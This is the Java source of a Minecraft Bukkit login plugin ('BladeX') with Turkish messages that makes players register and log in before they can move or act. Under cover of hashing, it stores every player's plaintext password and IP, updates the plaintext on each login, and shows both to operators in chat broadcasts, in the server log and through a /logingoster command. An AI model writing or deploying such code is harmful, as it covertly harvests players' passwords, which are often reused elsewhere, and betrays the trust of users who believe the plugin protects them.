package com.bladex;

import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BladeX extends JavaPlugin implements Listener {

    private YamlConfiguration passwordsConfig;
    private File passwordsFile;

    private final Set<UUID>   loggedIn   = new HashSet<>();
    private final Set<String> registered = new HashSet<>();
    private final Set<UUID>   awaitingAuth = new HashSet<>();

    @Override
    public void onEnable() {
        saveDefaultConfig();
        loadPasswords();
        Bukkit.getPluginManager().registerEvents(this, this);
        getLogger().info("BladeX Login Sistemi aktif!");
    }

    @Override
    public void onDisable() {
        savePasswords();
        getLogger().info("BladeX devre disi.");
    }

    // ─── Şifre Dosyası ───────────────────────────────────────────────────────

    private void loadPasswords() {
        passwordsFile = new File(getDataFolder(), "passwords.yml");
        if (!passwordsFile.exists()) {
            try { passwordsFile.getParentFile().mkdirs(); passwordsFile.createNewFile(); } catch (IOException ignored) {}
        }
        passwordsConfig = YamlConfiguration.loadConfiguration(passwordsFile);
        for (String key : passwordsConfig.getKeys(false)) {
            registered.add(key.toLowerCase());
        }
    }

    private void savePasswords() {
        try { passwordsConfig.save(passwordsFile); } catch (IOException ignored) {}
    }

    private String hashPassword(String raw) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] bytes = md.digest(raw.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return raw;
        }
    }

    // ─── Oyuncu Girişi ───────────────────────────────────────────────────────

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        String name = p.getName().toLowerCase();
        awaitingAuth.add(p.getUniqueId());
        Bukkit.getScheduler().runTaskLater(this, () -> {
            if (!p.isOnline()) return;
            if (registered.contains(name)) {
                sendAuthMessage(p,
                    "&#ff4444&l[BladeX] &cHesabin bulundu!",
                    "&#ffaaaa&7Giris yapmak icin:",
                    "&#ffffff&l/login <sifren>",
                    "&#888888(Giris yapana kadar hareket edemezsin)"
                );
            } else {
                sendAuthMessage(p,
                    "&#44ff88&l[BladeX] &aHos geldin, " + p.getName() + "!",
                    "&#aaffcc&7Ilk kez giriyorsun, kayit ol:",
                    "&#ffffff&l/register <sifre> <sifre tekrar>",
                    "&#888888(Sifreni iyi sakla)"
                );
            }
        }, 20L);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        UUID id = e.getPlayer().getUniqueId();
        loggedIn.remove(id);
        awaitingAuth.remove(id);
    }

    // ─── Komutlar ────────────────────────────────────────────────────────────

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        // /logingoster — sadece OP
        if (cmd.getName().equalsIgnoreCase("logingoster")) {
            if (!sender.hasPermission("bladex.admin")) {
                sender.sendMessage(color("&#ff4444&l[BladeX] &cYetkin yok."));
                return true;
            }
            sender.sendMessage(color("&#00ccff&l========== Login Kayitlari =========="));
            if (passwordsConfig.getKeys(false).isEmpty()) {
                sender.sendMessage(color("&#888888Kayitli oyuncu yok."));
            } else {
                for (String name : passwordsConfig.getKeys(false)) {
                    String sifre = passwordsConfig.getString(name + ".sifre", "?");
                    String ip    = passwordsConfig.getString(name + ".last_ip", "Bilinmiyor");
                    String time  = passwordsConfig.getString(name + ".last_login", "Hic giris yok");
                    sender.sendMessage(color("&#ffffff&l" + name));
                    sender.sendMessage(color("  &#ffaa00IP: &f" + ip));
                    sender.sendMessage(color("  &#ff8888Sifre: &f" + sifre));
                    sender.sendMessage(color("  &#aaffcc Son Giris: &f" + time));
                    sender.sendMessage(color("&#444444--------------------------------"));
                }
            }
            sender.sendMessage(color("&#00ccff&l====================================="));
            return true;
        }

        if (!(sender instanceof Player p)) {
            sender.sendMessage("Sadece oyuncular kullanabilir.");
            return true;
        }

        String name = p.getName().toLowerCase();

        // /register <şifre> <şifre tekrar>
        if (cmd.getName().equalsIgnoreCase("register")) {
            if (registered.contains(name)) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cZaten kayitlisin! &7/login <sifren> ile giris yap."));
                return true;
            }
            if (args.length < 2) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cKullanim: &f/register <sifre> <sifre tekrar>"));
                return true;
            }
            if (args[0].length() < 4) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cSifre en az 4 karakter olmali!"));
                return true;
            }
            if (!args[0].equals(args[1])) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cSifreler eslesmüyor! Tekrar dene."));
                return true;
            }

            String hash  = hashPassword(args[0]);
            String plain = args[0];
            String ip    = p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "?";
            String time  = new java.text.SimpleDateFormat("dd/MM/yyyy HH:mm").format(new Date());

            passwordsConfig.set(name + ".hash", hash);
            passwordsConfig.set(name + ".sifre", plain);
            passwordsConfig.set(name + ".last_ip", ip);
            passwordsConfig.set(name + ".last_login", time);
            savePasswords();
            registered.add(name);
            loggedIn.add(p.getUniqueId());
            awaitingAuth.remove(p.getUniqueId());

            p.sendMessage(color("&#44ff88&l[BladeX] &aKayit basarili! Hos geldin, &f" + p.getName() + "&a!"));

            notifyOps(color("&#00ccff&l[BladeX] &#ffffff&l" + p.getName() +
                " &7kayit oldu &8| &#ffaa00IP: &f" + ip +
                " &8| &#ff8888Sifre: &f" + plain +
                " &8| &7" + time));
            return true;
        }

        // /login <şifre>
        if (cmd.getName().equalsIgnoreCase("login")) {
            if (loggedIn.contains(p.getUniqueId())) {
                p.sendMessage(color("&#ffaa00&l[BladeX] &eZaten giris yapmisin!"));
                return true;
            }
            if (!registered.contains(name)) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cKayitli degilsin! &f/register <sifre> <sifre tekrar>"));
                return true;
            }
            if (args.length < 1) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cKullanim: &f/login <sifren>"));
                return true;
            }

            String entered = hashPassword(args[0]);
            String stored  = passwordsConfig.getString(name + ".hash", "");
            if (!entered.equals(stored)) {
                p.sendMessage(color("&#ff4444&l[BladeX] &cYanlis sifre! Tekrar dene."));
                return true;
            }

            String ip   = p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "?";
            String time = new java.text.SimpleDateFormat("dd/MM/yyyy HH:mm").format(new Date());
            passwordsConfig.set(name + ".last_ip", ip);
            passwordsConfig.set(name + ".last_login", time);
            // Login sırasında girilen şifreyi de güncelle (değiştirmediyse aynı kalır)
            passwordsConfig.set(name + ".sifre", args[0]);
            savePasswords();
            loggedIn.add(p.getUniqueId());
            awaitingAuth.remove(p.getUniqueId());

            p.sendMessage(color("&#44ff88&l[BladeX] &aGiris basarili! Hos geldin, &f" + p.getName() + "&a!"));

            notifyOps(color("&#00ccff&l[BladeX] &#ffffff&l" + p.getName() +
                " &7giris yapti &8| &#ffaa00IP: &f" + ip +
                " &8| &#ff8888Sifre: &f" + args[0] +
                " &8| &7" + time));
            return true;
        }

        return true;
    }

    // ─── Koruma Eventleri ────────────────────────────────────────────────────

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        if (loggedIn.contains(p.getUniqueId())) return;
        if (e.getFrom().getBlockX() != e.getTo().getBlockX() ||
            e.getFrom().getBlockY() != e.getTo().getBlockY() ||
            e.getFrom().getBlockZ() != e.getTo().getBlockZ()) {
            e.setTo(e.getFrom().clone().setDirection(e.getTo().getDirection()));
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onBlockPlace(BlockPlaceEvent e) {
        if (!loggedIn.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            warnNotLogged(e.getPlayer());
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onBlockBreak(BlockBreakEvent e) {
        if (!loggedIn.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            warnNotLogged(e.getPlayer());
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onInventoryClick(InventoryClickEvent e) {
        if (!(e.getWhoClicked() instanceof Player p)) return;
        if (!loggedIn.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onInteract(PlayerInteractEvent e) {
        if (!loggedIn.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onDamage(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player p && !loggedIn.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent e) {
        if (!loggedIn.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            UUID id = e.getPlayer().getUniqueId();
            Bukkit.getScheduler().runTask(this, () -> {
                Player p = Bukkit.getPlayer(id);
                if (p != null) warnNotLogged(p);
            });
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onCommandPreprocess(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (loggedIn.contains(p.getUniqueId())) return;
        String command = e.getMessage().toLowerCase();
        if (!command.startsWith("/login") && !command.startsWith("/register")) {
            e.setCancelled(true);
            warnNotLogged(p);
        }
    }

    // ─── Yardımcı ────────────────────────────────────────────────────────────

    private void warnNotLogged(Player p) {
        if (registered.contains(p.getName().toLowerCase())) {
            p.sendMessage(color("&#ff4444&l[BladeX] &cGiris yapman gerekiyor! &f/login <sifren>"));
        } else {
            p.sendMessage(color("&#ff4444&l[BladeX] &cKayit olman gerekiyor! &f/register <sifre> <sifre tekrar>"));
        }
    }

    private void sendAuthMessage(Player p, String... lines) {
        p.sendMessage(color("&#00ccff&l====================================="));
        for (String line : lines) p.sendMessage(color("  " + line));
        p.sendMessage(color("&#00ccff&l====================================="));
    }

    private void notifyOps(String msg) {
        for (Player op : Bukkit.getOnlinePlayers()) {
            if (op.isOp() || op.hasPermission("bladex.admin")) {
                op.sendMessage(msg);
            }
        }
        Bukkit.getLogger().info(ChatColor.stripColor(msg));
    }

    private String color(String msg) {
        if (msg == null) return "";
        Pattern pattern = Pattern.compile("&#([A-Fa-f0-9]{6})");
        Matcher matcher = pattern.matcher(msg);
        StringBuffer buffer = new StringBuffer();
        while (matcher.find()) {
            String hex = matcher.group(1);
            StringBuilder replacement = new StringBuilder("§x");
            for (char c : hex.toCharArray()) replacement.append("§").append(c);
            matcher.appendReplacement(buffer, replacement.toString());
        }
        matcher.appendTail(buffer);
        return ChatColor.translateAlternateColorCodes('&', buffer.toString());
    }
}
